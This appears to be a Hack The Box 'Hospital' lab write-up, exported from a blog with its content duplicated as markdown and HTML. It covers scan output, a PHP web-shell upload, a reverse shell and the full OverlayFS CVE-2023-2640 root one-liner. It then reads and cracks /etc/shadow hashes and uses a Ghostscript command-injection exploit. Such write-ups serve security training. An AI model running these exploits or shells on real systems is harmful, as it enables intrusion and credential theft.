 Product_Version: 10.0.17763\n|_  System_Time: 2024-02-26T01:03:21+00:00\n5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n6065/tcp open  msrpc             Microsoft Windows RPC\n6403/tcp open  msrpc             Microsoft Windows RPC\n6406/tcp open  msrpc             Microsoft Windows RPC\n6407/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n6409/tcp open  msrpc             Microsoft Windows RPC\n6617/tcp open  msrpc             Microsoft Windows RPC\n6635/tcp open  msrpc             Microsoft Windows RPC\n8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))\n|_http-open-proxy: Proxy might be redirecting requests\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n| http-title: Login\n|_Requested resource was login.php\n|_http-server-header: Apache/2.4.55 (Ubuntu)\n9389/tcp open  mc-nmf            .NET Message Framing\nService Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-time: \n|   date: 2024-02-26T01:03:19\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\n```\n\nFollowing our nmap scans, first off we check out the websites on ports `8080` and `443`.\n\n## Web Enumeration\n\nLoading out the websites on the respective ports, on port `443` we are met with a login site same case applies to port `8080`\n\n![port 443](https://imgur.com/mG8iUuG.png)\n\n![port 8080](https://imgur.com/tG024km.png)\n\n### Fuzzing\n\nThe next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.\n```bash\n.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms]\n.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms]\n.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms]\n.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms]\ncss                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms]\nfailed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms]\nfonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms]\nimages                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]\njs                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms]\nlogin.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]\nregister.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms]\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]\nsuccess.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms]\nupload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms]\nuploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms]\nvendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]\n```\n\nFirst thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.\n![](https://imgur.com/sZNmuyx.png)\n\nAfter logging in we are redirected to a page where we can upload files on the webpage.\n![](https://imgur.com/ySaSfRw.png)\n\nLook at this instantly we need to try out some file upload attacks and since we have the [resources](https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------) to do so. We see that we can that we can upload a `.phar` file instead of a php file which subsequently involves getting a shell through accessing the uploads file. \n\nFrom my research i opted to go with [powny](https://github.com/flozz/p0wny-shell) a very basic, single-file, PHP shell. After changing the extension to `phar` extension, we get a successful upload response.\nFrom our fuzzing earlier we saw an `/uploads` which can basically access files that we've uploaded, which triggers a shell on the box.\n\n![](https://imgur.com/Zc1hBoJ.png)\n\n\n## Initial Access.\nHaving landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using [pwncat](https://github.com/calebstewart/pwncat). Where we get an active session.\n![](https://imgur.com/1CxIELr.png)\n\n### Enumeration.\n\nRunning some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.\n![](https://imgur.com/ETUmbkq.png)\n\n\n![](https://imgur.com/JRWLY6J.png)\n\nA username called `drwilliams` trying to access his folder we are given permission denied as we are `www-data` and can't access content inside his folder due to insufficient permissions.\n\n![](https://imgur.com/kipG9XY.png)\n\n\n## Privesc \n\nChecking for vulnerabilities pertaining the system version we land on `CVE-2023–2640` a vulnerability that affects the Ubuntu kernel’s OverlayFS module.\n\nFirst off we need to identify if our system is running overlay.\n\n![](https://imgur.com/v18baZ9.png) \n\nand we see its running overlay to exploit this there's a public [POC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)\n\n```bash\nunshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\\\"/bin/bash\\\")'\"\n```\n\nwhich when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.\n\nRunning the `POC` we get some root access.\n![](https://imgur.com/QnESbaR.png)\n\nNow having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get `drwilliams`'s hash.Cracking the hash we get the password.\n\n![](https://imgur.com/Aa2jFb3l.png)\n\nwhich when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to `drwilliams` concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices [poc](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)\n\n![](https://imgur.com/FLksOng.png)\n\nAfter reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out [vsosciety_](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript)\n\n![](https://imgur.com/zJ8a8Gg.png)\n\n## Windows Foothold.\n\nAfter sending the payload, we receive a connection back.\n\n![](https://imgur.com/kra6hpU.png)\n\n![](https://imgur.com/oNcq1q2.png)\n\nNavigating to the `/Desktop` directory we get the user flag.\n\n![](https://imgur.com/oNcq1q2.png)\n\nFurther checking the `bat` file on the Documents directory we identify that there is an embedded password on the bat file.\n\n![](https://imgur.com/dKv1o8q.png)\n\n## Enumerating RPCCLIENT\nHaving the credentials and the information from our scans, `RPC` is open, trying out the creds we got on the bat file, we get access.\n\n## ROOT Foothold\n![](https://imgur.com/3G18Iz7.png)\n\nGoing back to the windows shell instance and enumerating further on the root directory there's a `xampp` directory which has `htdocs` where all the programs for the web pages will be stored.\n\n![](https://imgur.com/30Z8nOy.png)\n\nNotably, we can see there's a `shell.php` laying around. I replace the Content with that PHP Powny Shell.\nYou will get a Shell as Administrator and finally the Root Flag.\n\n![](https://imgur.com/TXTDJdT.png)\n\nChecking out pownyshell we get `system` access. \n\n![](https://imgur.com/u0zg5rf.png)","slug":"htb/Hospital/hospital-notes","published":1,"updated":"2024-07-16T20:38:27.402Z","_id":"clyouz1jf000gwgjn2mc2dusy","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png\"></p>\n<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro\"></a>Intro</h2><p>Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc</p>\n<h2 id=\"Initial-Recon\"><a href=\"#Initial-Recon\" class=\"headerlink\" title=\"Initial Recon\"></a>Initial Recon</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT     STATE SERVICE          REASON</span><br><span class=\"line\">22/tcp   open  ssh              syn-ack ttl 62</span><br><span class=\"line\">53/tcp   open  domain           syn-ack ttl 127</span><br><span class=\"line\">88/tcp   open  kerberos-sec     syn-ack ttl 127</span><br><span class=\"line\">135/tcp  open  msrpc            syn-ack ttl 127</span><br><span class=\"line\">139/tcp  open  netbios-ssn      syn-ack ttl 127</span><br><span class=\"line\">389/tcp  open  ldap             syn-ack ttl 127</span><br><span class=\"line\">443/tcp  open  https            syn-ack ttl 127</span><br><span class=\"line\">445/tcp  open  microsoft-ds     syn-ack ttl 127</span><br><span class=\"line\">464/tcp  open  kpasswd5         syn-ack ttl 127</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap   syn-ack ttl 127</span><br><span class=\"line\">636/tcp  open  ldapssl          syn-ack ttl 127</span><br><span class=\"line\">1801/tcp open  msmq             syn-ack ttl 127</span><br><span class=\"line\">2103/tcp open  zephyr-clt       syn-ack ttl 127</span><br><span class=\"line\">2105/tcp open  eklogin          syn-ack ttl 127</span><br><span class=\"line\">2107/tcp open  msmq-mgmt        syn-ack ttl 127</span><br><span class=\"line\">3268/tcp open  globalcatLDAP    syn-ack ttl 127</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl syn-ack ttl 127</span><br><span class=\"line\">3389/tcp open  ms-wbt-server    syn-ack ttl 127</span><br><span class=\"line\">5985/tcp open  wsman            syn-ack ttl 127</span><br><span class=\"line\">6065/tcp open  winpharaoh       syn-ack ttl 127</span><br><span class=\"line\">6403/tcp open  boe-cachesvr     syn-ack ttl 127</span><br><span class=\"line\">6406/tcp open  boe-processsvr   syn-ack ttl 127</span><br><span class=\"line\">6407/tcp open  boe-resssvr1     syn-ack ttl 127</span><br><span class=\"line\">6409/tcp open  boe-resssvr3     syn-ack ttl 127</span><br><span class=\"line\">6617/tcp open  unknown          syn-ack ttl 127</span><br><span class=\"line\">6635/tcp open  mpls-udp         syn-ack ttl 127</span><br><span class=\"line\">8080/tcp open  http-proxy       syn-ack ttl 62</span><br><span class=\"line\">9389/tcp open  adws             syn-ack ttl 127</span><br><span class=\"line\"></span><br><span class=\"line\">Read data files from: /usr/bin/../share/nmap</span><br><span class=\"line\"><span class=\"comment\"># Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds</span></span><br><span class=\"line\">                                                                                                                    </span><br><span class=\"line\">❯ <span class=\"built_in\">cat</span> Script_TCP_10.10.11.241.nmap</span><br><span class=\"line\"><span class=\"comment\"># Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241</span></span><br><span class=\"line\">Nmap scan report <span class=\"keyword\">for</span> 10.10.11.241</span><br><span class=\"line\">Host is up (0.48s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE           VERSION</span><br><span class=\"line\">22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey: </span><br><span class=\"line\">|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)</span><br><span class=\"line\">|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)</span><br><span class=\"line\">53/tcp   open  domain            Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z)</span><br><span class=\"line\">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: 2023-09-06T10:49:03</span><br><span class=\"line\">|_Not valid after:  2028-09-06T10:49:03</span><br><span class=\"line\">443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2009</span>-<span class=\"number\">11</span>-<span class=\"number\">10</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2019</span>-<span class=\"number\">11</span>-<span class=\"number\">08</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/<span class=\"number\">1.1</span></span><br><span class=\"line\"><span class=\"number\">445</span>/tcp  open  microsoft-ds?</span><br><span class=\"line\"><span class=\"number\">464</span>/tcp  open  kpasswd5?</span><br><span class=\"line\"><span class=\"number\">593</span>/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP <span class=\"number\">1.0</span></span><br><span class=\"line\"><span class=\"number\">636</span>/tcp  open  ldapssl?</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">1801</span>/tcp open  msmq?</span><br><span class=\"line\"><span class=\"number\">2103</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">2105</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">2107</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">3268</span>/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">3269</span>/tcp open  globalcatLDAPssl?</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC</span><br><span class=\"line\">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2023</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2028</span>-<span class=\"number\">09</span>-<span class=\"number\">06</span>T10:<span class=\"number\">49</span>:<span class=\"number\">03</span></span><br><span class=\"line\"><span class=\"number\">3389</span>/tcp open  ms-wbt-server     Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=DC.hospital.htb</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2024</span>-<span class=\"number\">02</span>-<span class=\"number\">24</span>T17:<span class=\"number\">09</span>:<span class=\"number\">39</span></span><br><span class=\"line\">|_Not valid after:  <span class=\"number\">2024</span>-<span class=\"number\">08</span>-<span class=\"number\">25</span>T17:<span class=\"number\">09</span>:<span class=\"number\">39</span></span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: HOSPITAL</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HOSPITAL</span><br><span class=\"line\">|   NetBIOS_Computer_Name: DC</span><br><span class=\"line\">|   DNS_Domain_Name: hospital.htb</span><br><span class=\"line\">|   DNS_Computer_Name: DC.hospital.htb</span><br><span class=\"line\">|   DNS_Tree_Name: hospital.htb</span><br><span class=\"line\">|   Product_Version: <span class=\"number\">10.0</span>.<span class=\"number\">17763</span></span><br><span class=\"line\">|_  System_Time: <span class=\"number\">2024</span>-<span class=\"number\">02</span>-<span class=\"number\">26</span>T01:<span class=\"number\">03</span>:<span class=\"number\">21</span>+<span class=\"number\">00</span>:<span class=\"number\">00</span></span><br><span class=\"line\"><span class=\"number\">5985</span>/tcp open  http              Microsoft HTTPAPI httpd <span class=\"number\">2.0</span> (SSDP/UPnP)</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/<span class=\"number\">2.0</span></span><br><span class=\"line\"><span class=\"number\">6065</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6403</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6406</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6407</span>/tcp open  ncacn_http        Microsoft Windows RPC over HTTP <span class=\"number\">1.0</span></span><br><span class=\"line\"><span class=\"number\">6409</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6617</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">6635</span>/tcp open  msrpc             Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">8080</span>/tcp open  http              Apache httpd <span class=\"number\">2.4</span>.<span class=\"number\">55</span> ((Ubuntu))</span><br><span class=\"line\">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class=\"line\">| http-cookie-flags: </span><br><span class=\"line\">|   /: </span><br><span class=\"line\">|     PHPSESSID: </span><br><span class=\"line\">|_      httponly flag not <span class=\"built_in\">set</span></span><br><span class=\"line\">| http-title: Login</span><br><span class=\"line\">|_Requested resource was login.php</span><br><span class=\"line\">|_http-server-header: Apache/2.4.55 (Ubuntu)</span><br><span class=\"line\">9389/tcp open  mc-nmf            .NET Message Framing</span><br><span class=\"line\">Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   <span class=\"built_in\">date</span>: 2024-02-26T01:03:19</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   3:1:1: </span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Following our nmap scans, first off we check out the websites on ports <code>8080</code> and <code>443</code>.</p>\n<h2 id=\"Web-Enumeration\"><a href=\"#Web-Enumeration\" class=\"headerlink\" title=\"Web Enumeration\"></a>Web Enumeration</h2><p>Loading out the websites on the respective ports, on port <code>443</code> we are met with a login site same case applies to port <code>8080</code></p>\n<p><img src=\"https://imgur.com/mG8iUuG.png\" alt=\"port 443\"></p>\n<p><img src=\"https://imgur.com/tG024km.png\" alt=\"port 8080\"></p>\n<h3 id=\"Fuzzing\"><a href=\"#Fuzzing\" class=\"headerlink\" title=\"Fuzzing\"></a>Fuzzing</h3><p>The next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]</span><br><span class=\"line\">                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms]</span><br><span class=\"line\">.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms]</span><br><span class=\"line\">.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms]</span><br><span class=\"line\">.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms]</span><br><span class=\"line\">config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms]</span><br><span class=\"line\">css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms]</span><br><span class=\"line\">failed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms]</span><br><span class=\"line\">fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]</span><br><span class=\"line\">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]</span><br><span class=\"line\">js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms]</span><br><span class=\"line\">login.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms]</span><br><span class=\"line\">logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]</span><br><span class=\"line\">register.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms]</span><br><span class=\"line\">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]</span><br><span class=\"line\">success.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms]</span><br><span class=\"line\">upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms]</span><br><span class=\"line\">uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms]</span><br><span class=\"line\">vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]</span><br></pre></td></tr></table></figure>\n\n<p>First thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.<br><img src=\"https://imgur.com/sZNmuyx.png\"></p>\n<p>After logging in we are redirected to a page where we can upload files on the webpage.<br><img src=\"https://imgur.com/ySaSfRw.png\"></p>\n<p>Look at this instantly we need to try out some file upload attacks and since we have the <a href=\"https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------\">resources</a> to do so. We see that we can that we can upload a <code>.phar</code> file instead of a php file which subsequently involves getting a shell through accessing the uploads file. </p>\n<p>From my research i opted to go with <a href=\"https://github.com/flozz/p0wny-shell\">powny</a> a very basic, single-file, PHP shell. After changing the extension to <code>phar</code> extension, we get a successful upload response.<br>From our fuzzing earlier we saw an <code>/uploads</code> which can basically access files that we’ve uploaded, which triggers a shell on the box.</p>\n<p><img src=\"https://imgur.com/Zc1hBoJ.png\"></p>\n<h2 id=\"Initial-Access\"><a href=\"#Initial-Access\" class=\"headerlink\" title=\"Initial Access.\"></a>Initial Access.</h2><p>Having landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using <a href=\"https://github.com/calebstewart/pwncat\">pwncat</a>. Where we get an active session.<br><img src=\"https://imgur.com/1CxIELr.png\"></p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration.\"></a>Enumeration.</h3><p>Running some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.<br><img src=\"https://imgur.com/ETUmbkq.png\"></p>\n<p><img src=\"https://imgur.com/JRWLY6J.png\"></p>\n<p>A username called <code>drwilliams</code> trying to access his folder we are given permission denied as we are <code>www-data</code> and can’t access content inside his folder due to insufficient permissions.</p>\n<p><img src=\"https://imgur.com/kipG9XY.png\"></p>\n<h2 id=\"Privesc\"><a href=\"#Privesc\" class=\"headerlink\" title=\"Privesc\"></a>Privesc</h2><p>Checking for vulnerabilities pertaining the system version we land on <code>CVE-2023–2640</code> a vulnerability that affects the Ubuntu kernel’s OverlayFS module.</p>\n<p>First off we need to identify if our system is running overlay.</p>\n<p><img src=\"https://imgur.com/v18baZ9.png\"> </p>\n<p>and we see its running overlay to exploit this there’s a public <a href=\"https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\">POC</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">unshare -<span class=\"built_in\">rm</span> sh -c <span class=\"string\">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; python3 -c &#x27;import os;os.setuid(0);os.system(\\&quot;/bin/bash\\&quot;)&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>which when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.</p>\n<p>Running the <code>POC</code> we get some root access.<br><img src=\"https://imgur.com/QnESbaR.png\"></p>\n<p>Now having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get <code>drwilliams</code>‘s hash.Cracking the hash we get the password.</p>\n<p><img src=\"https://imgur.com/Aa2jFb3l.png\"></p>\n<p>which when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to <code>drwilliams</code> concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices <a href=\"https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection\">poc</a></p>\n<p><img src=\"https://imgur.com/FLksOng.png\"></p>\n<p>After reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out <a href=\"https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript\">vsosciety_</a></p>\n<p><img src=\"https://imgur.com/zJ8a8Gg.png\"></p>\n<h2 id=\"Windows-Foothold\"><a href=\"#Windows-Foothold\" class=\"headerlink\" title=\"Windows Foothold.\"></a>Windows Foothold.</h2><p>After sending the payload, we receive a connection back.</p>\n<p><img src=\"https://imgur.com/kra6hpU.png\"></p>\n<p><img src=\"https://imgur.com/oNcq1q2.png\"></p>\n<p>Navigating to the <code>/Desktop</code> directory we get the user flag.</p>\n<p><img src=\"https://imgur.com/oNcq1q2.png\"></p>\n<p>Further checking the <code>bat</code> file on the Documents directory we identify that there is an embedded password on the bat file.</p>\n<p><img src=\"https://imgur.com/dKv1o8q.png\"></p>\n<h2 id=\"Enumerating-RPCCLIENT\"><a href=\"#Enumerating-RPCCLIENT\" class=\"headerlink\" title=\"Enumerating RPCCLIENT\"></a>Enumerating RPCCLIENT</h2><p>Having the credentials and the information from our scans, <code>RPC</code> is open, trying out the creds we got on the bat file, we get access.</p>\n<h2 